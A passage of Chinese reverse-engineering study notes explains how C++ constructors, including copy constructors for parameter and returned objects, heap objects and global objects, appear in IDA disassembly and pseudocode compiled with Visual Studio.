eax, [ebp-4]    ; 将this指针存入eax，作为返回值.text:00401013                 mov     esp, ebp.text:00401015                 pop     ebp.text:00401016                 retn.text:00401016 sub_401000      endp_DWORD *__thiscall sub_401000(_DWORD *this)&#123;  *this = 20;  return this;&#125;\n\n当进入对象的作用域时，编译器会产生调用构造函数的代码。因为构造函数属于成员函数，所以在调用的过程中同样需要传递this指针。构造函数调用结束后，会将this指针作为返回值。返回this指针便是构造函数的特征之一，结合C++的语法，我们可以总结识别局部对象构造函数的必要条件（请读者注意，并不是充分条件）。\n12345该成员函数是这个对象在作用域内调用的第一个成员函数，根据this指针可以区分每个对象。这个成员函数是通过thiscall方式调用的。这个函数返回this指针。\n\n构造函数必然满足以上3个条件，缺一不可。\n堆对象堆对象的识别重点在于识别堆空间的申请与使用。在C++的语法中，堆空间的申请需要使用malloc函数、new运算符或者其他同类功能的函数。因此，识别堆对象就有了重要依据，代码如下所示。\nPerson* p &#x3D; new Person();\n这行代码看上去是申请了一个类型为Person的堆对象，使用指针p保存了对象的首地址。因为产生了对象，所以此行代码将会调用Person类的无参构造函数。\n构造函数返回值的使用123456789101112131415161718#include &lt;stdio.h&gt;#include &lt;string.h&gt;#pragma warning(disable : 4996)class Person &#123;public:\tPerson() &#123;\t\tage = 20;\t&#125;\tint age;&#125;;int main(int argc, char* argv[]) &#123;\tPerson* p = new Person;\t//为了突出本节讨论的问题，这里没有检查new运算的返回值\tp-&gt;age = 21;\tprintf(&quot;%d\\n&quot;, p-&gt;age);\treturn 0;&#125;\n\nida汇编及伪代码视图：\n123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869.text:004010A0 ; __unwind &#123; // _main_SEH.text:004010A0                 push    ebp.text:004010A1                 mov     ebp, esp.text:004010A3                 push    0FFFFFFFFh.text:004010A5                 push    offset _main_SEH.text:004010AA                 mov     eax, large fs:0.text:004010B0                 push    eax.text:004010B1                 sub     esp, 10h.text:004010B4                 mov     eax, ___security_cookie.text:004010B9                 xor     eax, ebp.text:004010BB                 push    eax.text:004010BC                 lea     eax, [ebp-0Ch].text:004010BF                 mov     large fs:0, eax.text:004010C5                 push    4               ; Size，压入类的大小，用于堆内存申请.text:004010C7                 call    ??2@YAPAXI@Z    ; operator new(uint).text:004010CC                 add     esp, 4.text:004010CF                 mov     [ebp-10h], eax  ; 使用临时变量保存new返回值.text:004010D2 ;   try &#123;.text:004010D2                 mov     dword ptr [ebp-4], 0.text:004010D9                 cmp     dword ptr [ebp-10h], 0 ; 检测堆内存是否申请成功.text:004010DD                 jz      short loc_4010EC ; 申请失败则跳过构造函数调用.text:004010DF                 mov     ecx, [ebp-10h]  ; 申请成功，将对象首地址传入ecx.text:004010E2                 call    sub_401080      ; 调用构造函数.text:004010E7                 mov     [ebp-14h], eax  ; 构造函数返回this指针，保存到临时变量ebp-14h中.text:004010EA                 jmp     short loc_4010F3.text:004010EC ; ---------------------------------------------------------------------------.text:004010EC.text:004010EC loc_4010EC:                             ; CODE XREF: _main+3D↑j.text:004010EC                 mov     dword ptr [ebp-14h], 0 ; 申请堆空间失败，设置指针值为NULL.text:004010F3.text:004010F3 loc_4010F3:                             ; CODE XREF: _main+4A↑j.text:004010F3                 mov     eax, [ebp-14h].text:004010F6                 mov     [ebp-1Ch], eax  ; 当没有打开/02选项时，对象地址将在几个临时变量中倒换，最终保存到[ebp-1Ch]中，这是指针变量p.text:004010F6 ;   &#125; // starts at 4010D2.text:004010F9                 mov     dword ptr [ebp-4], 0FFFFFFFFh.text:00401100                 mov     ecx, [ebp-1Ch]  ; ecx得到this指针.text:00401103                 mov     [ebp-18h], ecx.text:00401106                 mov     edx, [ebp-18h].text:00401109                 mov     dword ptr [edx], 15h ; 为成员变量age赋值21.text:0040110F                 mov     eax, [ebp-18h].text:00401112                 mov     ecx, [eax]      ; 参数2，p-&gt;age.text:00401114                 push    ecx             ; char.text:00401115                 push    offset Format   ; &quot;%d\\n&quot;.text:0040111A                 call    sub_401040      ; 调用printf函数.text:0040111F                 add     esp, 8.text:00401122                 xor     eax, eax.text:00401124                 mov     ecx, [ebp-0Ch].text:00401127                 mov     large fs:0, ecx.text:0040112E                 pop     ecx.text:0040112F                 mov     esp, ebp.text:00401131                 pop     ebp.text:00401132                 retn.text:00401132 ; &#125; // starts at 4010A0.text:00401132 _main           endpint __cdecl main(int argc, const char **argv, const char **envp)&#123;  _DWORD *v4; // [esp+Ch] [ebp-14h]  _DWORD *Block; // [esp+10h] [ebp-10h]  Block = operator new(4u);  if ( Block )    v4 = sub_401080(Block);  else    v4 = 0;  *v4 = 21;  sub_401040(&quot;%d\\n&quot;, *v4);  return 0;&#125;\n\nVS编译器使用new申请堆空间之后，需要调用构造函数，以完成对象的数据成员初始化。如果堆空间申请失败，则会避开构造函数的调用。因为在C++语法中，如果new运算执行成功，返回值便是对象的首地址，否则为NULL。因此，需要编译器检查堆空间的申请结果，产生一个双分支结构，以决定是否触发构造函数。在识别堆对象的构造函数时，应重点分析此双分支结构。找到new运算的调用后，可立即在下文寻找判定new返回值的代码，在判定成功（new的返回值非0）的分支处迅速定位并得到构造函数。在GCC和Clang编译器中并不检查构造函数的返回值，应当注意区别。\n在使用new申请对象堆空间时，许多初学者很容易将有参构造函数与对象数组搞混，在申请对象数组时很容易写错，将申请对象数组写成调用有参构造函数。以int类型的堆空间申请为例，代码如下所示。\n12345// 圆括号是调用有参构造函数，最后只申请了一个int类型的堆变量并赋初值10int *p= new int(10);// 方括号才是申请了10个int元素的堆数组int *p = new int[10];\n\n参数对象参数对象属于局部对象中的一种特殊情况。当对象作为函数参数时，调用一个特殊的构造函数——复制构造函数。该构造函数只有一个参数，类型为对象的引用。当对象为参数时，会触发此类对象的复制构造函数。如果在函数调用时传递参数对象，参数会进行复制，形参是实参的副本，相当于复制构造了一个全新的对象。\n浅拷贝由于定义了新对象，因此会触发复制构造函数，在这个特殊的构造函数中完成两个对象间数据的复制。如没有定义复制构造函数，编译器会对原对象与复制对象中的各数据成员直接进行数据复制，称为默认复制构造函数，这种复制方式属于浅拷贝\n12345678910111213141516#include &lt;stdio.h&gt;#include &lt;string.h&gt;#pragma warning(disable : 4996)class Person &#123;public:\tPerson() &#123;\t\tage = 20;\t&#125;\tint age;&#125;;int main(int argc, char* argv[]) &#123;\tPerson obj1; \tPerson obj2(obj1); //Person中没有提供参数为对象引用的构造函数\treturn 0;&#125;\n\nida汇编及伪代码视图：\n12345678910111213141516171819202122232425262728.text:00401020 ; int __cdecl main(int argc, const char **argv, const char **envp).text:00401020 _main           proc near               ; CODE XREF: __scrt_common_main_seh(void)+F5↓p.text:00401020.text:00401020 var_C           = dword ptr -0Ch.text:00401020 var_8           = dword ptr -8.text:00401020 var_4           = dword ptr -4.text:00401020 argc            = dword ptr  8.text:00401020 argv            = dword ptr  0Ch.text:00401020 envp            = dword ptr  10h.text:00401020.text:00401020                 push    ebp.text:00401021                 mov     ebp, esp.text:00401023                 sub     esp, 0Ch.text:00401026                 mov     eax, ___security_cookie.text:0040102B                 xor     eax, ebp.text:0040102D                 mov     [ebp-4], eax.text:00401030                 lea     ecx, [ebp-8]    ; ecx=&amp;obj1.text:00401033                 call    sub_401000      ; 调用构造函数.text:00401038                 mov     eax, [ebp-8]    ; 取出对象obj1中的数据成员信息.text:0040103B                 mov     [ebp-0Ch], eax  ; 赋值对象obj2中的数据成员信息.text:0040103E                 xor     eax, eax.text:00401040                 mov     ecx, [ebp-4].text:00401043                 xor     ecx, ebp        ; StackCookie.text:00401045                 call    @__security_check_cookie@4 ; __security_check_cookie(x).text:0040104A                 mov     esp, ebp.text:0040104C                 pop     ebp.text:0040104D                 retn.text:0040104D _main           endp\n\n深拷贝当类中有资源申请，并以数据成员来保存这些资源时，就需要使用者自己提供一个复制构造函数。在复制构造函数中，要处理的不仅仅是源对象的各数据成员，还有它们指向的资源数据。把这种源对象中的数据成员间接访问到的其他资源并制作副本的复制构造函数称为深拷贝\n12345678910111213141516171819202122232425262728293031323334353637#include &lt;stdio.h&gt;#include &lt;string.h&gt;#pragma warning(disable : 4996)class Person &#123;public:\tPerson() &#123;\t\tname = NULL;//无参构造函数，初始化指针\t&#125;\tPerson(const Person&amp; obj) &#123;\t\t// 注：如果在复制构造函数中直接复制指针值，那么对象内的两个成员指针会指向同一个资源，这属于浅拷贝\t\t\t// this-&gt;name = obj.name;\t\t\t// 为实参对象中的指针所指向的堆空间制作一份副本，这就是深拷贝了\t\t\tint len = strlen(obj.name);\t\tthis-&gt;name = new char[len + sizeof(char)]; // 为便于讲解，这里没有检查指针\t\t\tstrcpy(this-&gt;name, obj.name);\t&#125;\tvoid setName(const char* name) &#123;\t\tint len = strlen(name);\t\tif (this-&gt;name != NULL) &#123;\t\t\tdelete[] this-&gt;name;\t\t&#125;\t\tthis-&gt;name = new char[len + sizeof(char)]; // 为便于讲解，这里没有检查指针\t\t\tstrcpy(this-&gt;name, name);\t&#125;public:\tchar* name;&#125;;void show(Person person) &#123; // 参数是对象类型，会触发复制构造函数\tprintf(&quot;name:%s\\n&quot;, person.name);&#125;int main(int argc, char* argv[]) &#123;\tPerson person;\tperson.setName(&quot;Hello&quot;);\tshow(person);\treturn 0;&#125;\n\nida汇编及伪代码视图：\n123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207//main函数.text:00401220 ; int __cdecl main(int argc, const char **argv, const char **envp).text:00401220 _main           proc near               ; CODE XREF: __scrt_common_main_seh(void)+F5↓p.text:00401220.text:00401220 var_8           = byte ptr -8.text:00401220 var_4           = dword ptr -4.text:00401220 argc            = dword ptr  8.text:00401220 argv            = dword ptr  0Ch.text:00401220 envp            = dword ptr  10h.text:00401220.text:00401220                 push    ebp.text:00401221                 mov     ebp, esp.text:00401223                 sub     esp, 8.text:00401226                 mov     eax, ___security_cookie.text:0040122B                 xor     eax, ebp.text:0040122D                 mov     [ebp-4], eax.text:00401230                 push    4               ; Size，类对象大小.text:00401232                 lea     ecx, [ebp-8]    ; ecx=&amp;person.text:00401235                 call    sub_401280      ; __autoclassinit2.text:0040123A                 lea     ecx, [ebp-8]    ; ecx=&amp;person.text:0040123D                 call    unknown_libname_1 ; 调用无参构造函数.text:00401242                 push    offset aHello   ; &quot;Hello&quot;.text:00401247                 lea     ecx, [ebp-8]    ; ecx=&amp;person.text:0040124A                 call    sub_401140      ; 调用成员函setName.text:0040124F                 push    ecx             ; 这里的push ecx等价于sub esp,4，但是push ecx的机器码更短，效率更高.text:0040124F                                         ; Person的类型长度为4字节，所以传递参数对象的时候需要在栈顶留下4字节，以作为参数对象的空间.text:0040124F                                         ; 此时esp保存的内容就是参数对象的地址.text:00401250                 mov     ecx, esp        ; 获取参数对象的地址，保存到ecx中.text:00401252                 lea     eax, [ebp-8]    ; 获取对象person的地址并保存到eax中.text:00401255                 push    eax             ; 参数1，将person地址作为参数.text:00401256                 call    sub_4010A0      ; 调用复制构造函数.text:0040125B                 call    __set_purecall_handler ; 此时栈顶上的参数对象传递完毕，开始调用show函数.text:00401260                 add     esp, 4.text:00401263                 xor     eax, eax.text:00401265                 mov     ecx, [ebp-4].text:00401268                 xor     ecx, ebp        ; StackCookie.text:0040126A                 call    @__security_check_cookie@4 ; __security_check_cookie(x).text:0040126F                 mov     esp, ebp.text:00401271                 pop     ebp.text:00401272                 retn.text:00401272 _main           endpint __cdecl main(int argc, const char **argv, const char **envp)&#123;  void (__cdecl *v3)(); // ecx  void (__cdecl *v5)(); // [esp-4h] [ebp-Ch]  char v6[4]; // [esp+0h] [ebp-8h] BYREF  sub_401280(4u);  unknown_libname_1(v6);  sub_401140(&quot;Hello&quot;);  v5 = v3;  sub_4010A0(v6);  _set_purecall_handler(v5);  return 0;&#125;//__autoclassinit2函数//一旦类中定义有指针变量并且有构造函数（和初始化列表无关）就会自动调用 __autoclassinit2//__autoclassinit2的主要工作就是 memset 对象的内存为0；//调用前传递了person对象大小进去 push 0x4.text:00401280 ; void *__thiscall sub_401280(void *this, size_t Size).text:00401280 sub_401280      proc near               ; CODE XREF: _main+15↑p.text:00401280.text:00401280 var_4           = dword ptr -4.text:00401280 Size            = dword ptr  8.text:00401280.text:00401280                 push    ebp.text:00401281                 mov     ebp, esp.text:00401283                 push    ecx.text:00401284                 mov     [ebp-4], ecx.text:00401287                 mov     eax, [ebp+Size].text:0040128A                 push    eax             ; Size.text:0040128B                 push    0               ; Val.text:0040128D                 mov     ecx, [ebp-4].text:00401290                 push    ecx             ; void *.text:00401291                 call    memset.text:00401296                 add     esp, 0Ch.text:00401299                 mov     esp, ebp.text:0040129B                 pop     ebp.text:0040129C                 retn    4.text:0040129C sub_401280      endpvoid *__thiscall sub_401280(void *this, size_t Size)&#123;  return memset(this, 0, Size);&#125;//复制构造函数.text:004010A0 ; _DWORD *__thiscall sub_4010A0(_DWORD *this, const char **).text:004010A0 sub_4010A0      proc near               ; CODE XREF: _main+36↓p.text:004010A0.text:004010A0 var_28          = dword ptr -28h.text:004010A0 var_24          = dword ptr -24h.text:004010A0 var_20          = dword ptr -20h.text:004010A0 var_1C          = dword ptr -1Ch.text:004010A0 var_18          = dword ptr -18h.text:004010A0 var_14          = dword ptr -14h.text:004010A0 var_10          = dword ptr -10h.text:004010A0 var_C           = dword ptr -0Ch.text:004010A0 var_8           = dword ptr -8.text:004010A0 var_2           = byte ptr -2.text:004010A0 var_1           = byte ptr -1.text:004010A0 arg_0           = dword ptr  8.text:004010A0.text:004010A0                 push    ebp.text:004010A1                 mov     ebp, esp.text:004010A3                 sub     esp, 28h.text:004010A6                 mov     [ebp-14h], ecx  ; [ebp-14]保存this指针.text:004010A9                 mov     eax, [ebp+8]    ; eax=&amp;obj.text:004010AC                 mov     ecx, [eax]      ; ecx=obj.name.text:004010AE                 mov     [ebp-8], ecx    ; 计算obj.name的长度.text:004010B1                 mov     edx, [ebp-8].text:004010B4                 add     edx, 1.text:004010B7                 mov     [ebp-18h], edx.text:004010BA.text:004010BA loc_4010BA:                             ; CODE XREF: sub_4010A0+2A↓j.text:004010BA                 mov     eax, [ebp-8].text:004010BD                 mov     cl, [eax].text:004010BF                 mov     [ebp-2], cl.text:004010C2                 add     dword ptr [ebp-8], 1.text:004010C6                 cmp     byte ptr [ebp-2], 0.text:004010CA                 jnz     short loc_4010BA.text:004010CC                 mov     edx, [ebp-8].text:004010CF                 sub     edx, [ebp-18h].text:004010D2                 mov     [ebp-1Ch], edx.text:004010D5                 mov     eax, [ebp-1Ch].text:004010D8                 mov     [ebp-20h], eax.text:004010DB                 mov     ecx, [ebp-20h].text:004010DE                 add     ecx, 1          ; 参数1，len +1.text:004010E1                 push    ecx.text:004010E2                 call    sub_4012B2      ; 调用new函数.text:004010E7                 add     esp, 4.text:004010EA                 mov     [ebp-24h], eax.text:004010ED                 mov     edx, [ebp-14h].text:004010F0                 mov     eax, [ebp-24h].text:004010F3                 mov     [edx], eax.text:004010F5                 mov     ecx, [ebp+8].text:004010F8                 mov     edx, [ecx].text:004010FA                 mov     [ebp-10h], edx.text:004010FD                 mov     eax, [ebp-14h].text:00401100                 mov     ecx, [eax]      ; this-&gt;name = new char[len +sizeof(char)];.text:00401102                 mov     [ebp-0Ch], ecx.text:00401105                 mov     edx, [ebp-0Ch].text:00401108                 mov     [ebp-28h], edx.text:0040110B.text:0040110B loc_40110B:                             ; CODE XREF: sub_4010A0+91↓j.text:0040110B                 mov     eax, [ebp-10h].text:0040110E                 mov     cl, [eax].text:00401110                 mov     [ebp-1], cl.text:00401113                 mov     edx, [ebp-0Ch].text:00401116                 mov     al, [ebp-1].text:00401119                 mov     [edx], al.text:0040111B                 mov     ecx, [ebp-10h].text:0040111E                 add     ecx, 1.text:00401121                 mov     [ebp-10h], ecx.text:00401124                 mov     edx, [ebp-0Ch].text:00401127                 add     edx, 1.text:0040112A                 mov     [ebp-0Ch], edx.text:0040112D                 cmp     byte ptr [ebp-1], 0.text:00401131                 jnz     short loc_40110B.text:00401133                 mov     eax, [ebp-14h].text:00401136                 mov     esp, ebp.text:00401138                 pop     ebp.text:00401139                 retn    4.text:00401139 sub_4010A0      endp_DWORD *__thiscall sub_4010A0(_DWORD *this, const char **a2)&#123;  const char *v4; // [esp+18h] [ebp-10h]  _BYTE *v5; // [esp+1Ch] [ebp-Ch]  char v6; // [esp+27h] [ebp-1h]  *this = sub_4012B2(&amp;(*a2)[strlen(*a2) + 1] - *a2);  v4 = *a2;  v5 = (_BYTE *)*this;  do  &#123;    v6 = *v4;    *v5++ = *v4++;  &#125;  while ( v6 );  return this;&#125;//show函数.text:00401200 ; _purecall_handler __cdecl _set_purecall_handler(_purecall_handler Handler).text:00401200 __set_purecall_handler proc near        ; CODE XREF: _main+3B↓p.text:00401200.text:00401200 Handler         = dword ptr  8.text:00401200.text:00401200                 push    ebp.text:00401201                 mov     ebp, esp.text:00401203                 mov     eax, [ebp+Handler].text:00401206                 push    eax             ; char.text:00401207                 push    offset Format   ; &quot;name:%s\\n&quot;.text:0040120C                 call    sub_401040.text:00401211                 add     esp, 8.text:00401214                 pop     ebp.text:00401215                 retn.text:00401215 __set_purecall_handler endp_purecall_handler __cdecl _set_purecall_handler(_purecall_handler Handler)&#123;  return (_purecall_handler)sub_401040(&quot;name:%s\\n&quot;, (const char *)Handler);&#125;\n\n上面代码中，在执行函数show之前，先进入Person的复制构造函数中。在复制构造函数中，我们使用的是深拷贝方式。这时数据成员this-&gt;name和obj.name保存的地址不同，但其中的数据内容却是相同的。\n由于使用了深拷贝方式，对对象中的数据成员指向的堆空间数据也进行了数据复制，因此当参数对象被销毁时，释放的堆空间数据是复制对象制作的数据副本，对源对象没有任何影响。另外需要注意的是，对于GCC编译器，show函数的参数对象的析构函数是在main()函数中调用的。\nC++ __autoclassinit2一旦类中定义有指针变量并且有构造函数（和初始化列表无关）就会自动调用 __autoclassinit2\n__autoclassinit2的主要工作就是 memset 对象的内存为0；\n参考：https://www.cnblogs.com/Dir-A/p/16879399.html\n返回对象返回对象与参数对象相似，都是局部对象中的一种特殊情况。由于函数返回时需要对返回对象进行复制，因此同样会使用复制构造函数。但是，两者使用复制构造函数的时机不同。当对象为参数时，在进入函数前使用复制构造函数，而返回对象则在函数返回时使用复制构造函数。\n12345678910111213141516171819202122232425262728293031323334353637#include &lt;stdio.h&gt;#include &lt;string.h&gt;#pragma warning(disable : 4996)class Person &#123;public:\tPerson() &#123;\t\tname = NULL;//无参构造函数，初始化指针\t&#125;\tPerson(const Person&amp; obj) &#123;\t\t// 注：如果在复制构造函数中直接复制指针值，那么对象内的两个成员指针会指向同一个资源，这属于浅拷贝\t\t\t// this-&gt;name = obj.name;\t\t\t// 为实参对象中的指针所指向的堆空间制作一份副本，这就是深拷贝了\t\t\tint len = strlen(obj.name);\t\tthis-&gt;name = new char[len + sizeof(char)]; // 为便于讲解，这里没有检查指针\t\t\tstrcpy(this-&gt;name, obj.name);\t&#125;\tvoid setName(const char* name) &#123;\t\tint len = strlen(name);\t\tif (this-&gt;name != NULL) &#123;\t\t\tdelete[] this-&gt;name;\t\t&#125;\t\tthis-&gt;name = new char[len + sizeof(char)]; // 为便于讲解，这里没有检查指针\t\t\tstrcpy(this-&gt;name, name);\t&#125;public:\tchar* name;&#125;;Person getObject() &#123;\tPerson person;\tperson.setName(&quot;Hello&quot;);\treturn person; //返回类型为对象&#125;int main(int argc, char* argv[]) &#123;\tPerson person = getObject();\treturn 0;&#125;\n\nida汇编及伪代码视图：\n123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687//main函数.text:004011F0 ; int __cdecl main(int argc, const char **argv, const char **envp).text:004011F0 _main           proc near               ; CODE XREF: __scrt_common_main_seh(void)+F5↓p.text:004011F0.text:004011F0 var_8           = byte ptr -8.text:004011F0 var_4           = dword ptr -4.text:004011F0 argc            = dword ptr  8.text:004011F0 argv            = dword ptr  0Ch.text:004011F0 envp            = dword ptr  10h.text:004011F0.text:004011F0                 push    ebp.text:004011F1                 mov     ebp, esp.text:004011F3                 sub     esp, 8.text:004011F6                 mov     eax, ___security_cookie.text:004011FB                 xor     eax, ebp.text:004011FD                 mov     [ebp-4], eax.text:00401200                 push    4               ; Size.text:00401202                 lea     ecx, [ebp-8].text:00401205                 call    __autoclassinit2 ; 调用__autoclassinit2.text:0040120A                 lea     eax, [ebp-8]    ; 取对象person的首地址.text:0040120D                 push    eax             ; 将对象的首地址作为参数传递.text:0040120E                 call    sub_401180      ; 调用getObject函数.text:00401213                 add     esp, 4.text:00401216                 xor     eax, eax.text:00401218                 mov     ecx, [ebp-4].text:0040121B                 xor     ecx, ebp        ; StackCookie.text:0040121D                 call    @__security_check_cookie@4 ; __security_check_cookie(x).text:00401222                 mov     esp, ebp.text:00401224                 pop     ebp.text:00401225                 retn.text:00401225 _main           endpint __cdecl main(int argc, const char **argv, const char **envp)&#123;  char v4[4]; // [esp+0h] [ebp-8h] BYREF  _autoclassinit2(4u);  sub_401180(v4);  return 0;&#125;//getObject函数.text:00401180 ; int __cdecl sub_401180(int).text:00401180 sub_401180      proc near               ; CODE XREF: _main+1E↓p.text:00401180.text:00401180 var_8           = byte ptr -8.text:00401180 var_4           = dword ptr -4.text:00401180 arg_0           = dword ptr  8.text:00401180.text:00401180                 push    ebp.text:00401181                 mov     ebp, esp.text:00401183                 sub     esp, 8.text:00401186                 mov     eax, ___security_cookie.text:0040118B                 xor     eax, ebp.text:0040118D                 mov     [ebp-4], eax.text:00401190                 push    4               ; Size.text:00401192                 lea     ecx, [ebp-8].text:00401195                 call    __autoclassinit2.text:0040119A                 lea     ecx, [ebp-8]    ; 将局部对象的首地址作为参数传递.text:0040119D                 call    unknown_libname_1 ; 调用构造函数.text:004011A2                 push    offset aHello   ; &quot;Hello&quot;.text:004011A7                 lea     ecx, [ebp-8]    ; 将局部对象的首地址作为参数传递.text:004011AA                 call    sub_4010C0      ; 调用成员函数setName.text:004011AF                 lea     eax, [ebp-8]    ; 获取局部对象的首地址.text:004011B2                 push    eax             ; 将局部对象的地址作为参数.text:004011B3                 mov     ecx, [ebp+8]    ; 获取参数中保存的this指针.text:004011B6                 call    sub_401020      ; 调用复制构造函数.text:004011BB                 mov     eax, [ebp+8]    ; 将参数作为返回值.text:004011BE                 mov     ecx, [ebp-4].text:004011C1                 xor     ecx, ebp        ; StackCookie.text:004011C3                 call    @__security_check_cookie@4 ; __security_check_cookie(x).text:004011C8                 mov     esp, ebp.text:004011CA                 pop     ebp.text:004011CB                 retn.text:004011CB sub_401180      endpint __cdecl sub_401180(int a1)&#123;  char v2[4]; // [esp+0h] [ebp-8h] BYREF  _autoclassinit2(4u);  unknown_libname_1(v2);  sub_4010C0(&quot;Hello&quot;);  sub_401020(v2);  return a1;&#125;\n\ngetObject将返回对象的地址作为函数参数。在函数返回之前，利用复制构造函数将函数中局部对象的数据复制到参数指向的对象中，起到了返回对象的作用。GCC和Clang编译器优化了复制构造函数的调用，与直接构造参数对象功能是等价的。等价的函数原型如下所示。\nPerson* getObject(Person* p);\n虽然编译器会对返回值为对象类型的函数进行调整，修改其参数与返回值，但是它留下了一个与返回指针类型不同的象征，就是在函数中使用构造函数。返回值和参数是对象指针类型的函数，不会使用以参数为目标的构造函数，而是直接使用指针保存对象首地址，代码如下所示\n1234567//函数的返回类型与参数类型都是对象的指针类型Person* getObject(Person* p) &#123;Person person; // 定义局部对象person.setName(&quot;World&quot;);p = &amp;person;return p;&#125;\n\n12345678910111213141516171800401000 push ebp00401001 mov ebp, esp00401003 sub esp, 800401006 lea ecx, [ebp-4]00401009 call sub_4010700040100E push offset aWorld ;&quot;World&quot;00401013 lea ecx, [ebp-4]00401016 call sub_4010D00040101B lea eax, [ebp-4]0040101E mov [ebp+8], eax00401021 mov ecx, [ebp+8]00401024 mov [ebp-8], ecx ;直接保存局部对象首地址00401027 lea ecx, [ebp-4]0040102A call sub_4010900040102F mov eax, [ebp-8] ;将局部对象作为返回值00401032 mov esp, ebp00401034 pop ebp00401035 retn\n\n在使用指针作为参数和返回值时，函数内没有对构造函数的调用。以此为依据，便可以分辨参数或返回值是对象还是对象的指针。如果在函数内为参数指针申请了堆对象，就会存在new运算和构造函数的调用，因此更容易分辨参数和返回值了。\n全局对象与静态对象全局对象与全局静态对象的构造时机相同，它们构造函数的调用被隐藏在深处，但识别过程很简单。这似乎是矛盾的，但事实的确如此，这是因为程序中所有全局对象会在同一地点以初始化数据调用构造函数。既然调用构造函数被固定在了某一个点上，无论这个点被隐藏得多深，只须找到一次即可。\n前面启动函数时分析过_cinit函数（位于VS2019的启动函数mainCRTStartup中）。全局对象的构造函数初始化就是在此函数中实现的。在函数_cinit的_initterm函数调用中，初始化了全局对象。\n_initterm实现的代码片段如下。\n123456789extern &quot;C&quot; void __cdecl _initterm(_PVFV* const first, _PVFV* const last)&#123;\tfor (_PVFV* it = first; it != last; ++it)\t&#123;\t\tif (*it == nullptr)\t\t\tcontinue;\t\t(**it)();\t&#125;&#125;\n\n当it不为NULL时，执行(**it)()；后并不会进入全局对象的构造函数，而是进入编译器提供的构造代理函数，由一个负责全局对象的构造代理函数完成调用全局构造函数\n全局对象构造代理函数和析构代理函数的分析12345678910111213141516171819#include &lt;stdio.h&gt;#include &lt;string.h&gt;#pragma warning(disable : 4996)class Person &#123;public:\tPerson() &#123;\t\tprintf(&quot;Person()&quot;);\t&#125;\t~Person() &#123;\t\tprintf(&quot;~Person()&quot;);\t&#125;&#125;;Person g_person1; //定义全局对象Person g_person2; //定义全局对象int main(int argc, char* argv[]) &#123;\tprintf(&quot;main&quot;);\treturn 0;&#125;\n\n1.首先通过Ctrl+E键定位到mainCRTStartup函数，然后再进入__scrt_common_main_seh函数\n\n2.在__scrt_common_main_seh函数有两个函数用于全局数据的初始化\n_initterm_e函数用于对C语言进行初始化\n\n_initterm函数用于对C++语言进行初始化\n\n3.全局类对象的构造代理函数数组就位于_initterm函数的两个参数之间\n\n4.构造代理函数1及析构代理函数1\n\n\n5.构造代理函数2及析构代理函数2\n\n\n\n\n\n\n\n\n\n\n\n跟踪全局对象的构造函数\n在分析的过程中该如何跟踪全局对象的构造函数呢？可使用两种方法：直接定位初始化函数和利用栈回溯。\n1. 直接定位初始化函数\n先进入mainCRTStartup函数，顺藤摸瓜找到初始化函数_cinit，在_cinit函数的第二个_initterm处设置断点。运行程序后，进入_initterm的实现代码内，断点在(**it)()；执行处，单步进入代理构造，即可得到全局对象的构造函数。读者可以先在源码环境下单步跟踪，待熟悉后就可以脱离源码，直接在反汇编的条件下利用OllyDbg或者WinDbg等调试工具熟悉反汇编代码，尝试用自己的方法总结出快速识别初始化函数的规律。对于GCC编译器，则通过main()函数定位___main函数的位置。\n2. 利用栈回溯\n如果反汇编代码中出现了全局对象，因为全局对象的地址固定（对于有重定位表的执行文件中的全局对象，也可以在执行文件被加载后至执行前计算得到全局对象的地址），所以可以在对象的数据成员中设置读写断点，调试运行程序，等待调用构造函数。利用栈回溯窗口，找到程序的执行流程，依次向上查询即可找到构造函数调用的起始处。\n其实，最简单的办法是对atexit设置断点，这是因为构造代理函数中会注册析构函数，其注册的方式是使用atexit\n每个对象是否都有默认的构造函数在许多情况下，编译器并没有提供默认的构造函数，而且02选项优化编译后，某些结构简单的类会被转换为\n连续定义的变量\n没有定义构造函数的类123456789101112131415161718192021#include &lt;stdio.h&gt;#include &lt;string.h&gt;#pragma warning(disable : 4996)class Person &#123;public:\tvoid setAge(int age) &#123;\t\tthis-&gt;age = age;\t&#125;\tint getAge() &#123;\t\treturn age;\t&#125;private:\tint age;&#125;;int main(int argc, char* argv[]) &#123;\tPerson person;\tperson.setAge(20);\tprintf(&quot;%d\\n&quot;, person.getAge());\treturn 0;&#125;\n\n\n上面代码中，对象person的定义处没有任何对应的汇编代码，也没有构造函数的调用过程，可见编译器并没有为其提供默认的构造函数。\n那么，在何种情况下编译器会提供默认的构造函数呢？有以下两种情况。\n1. 本类和本类中定义的成员对象或者父类中存在虚函数\n因为需要初始化虚表，且这个工作理应在构造函数中隐式完成，所以在没有定义构造函数的情况下，编译器会添加默认的构造函数，用于隐式完成虚表的初始化工作\n2. 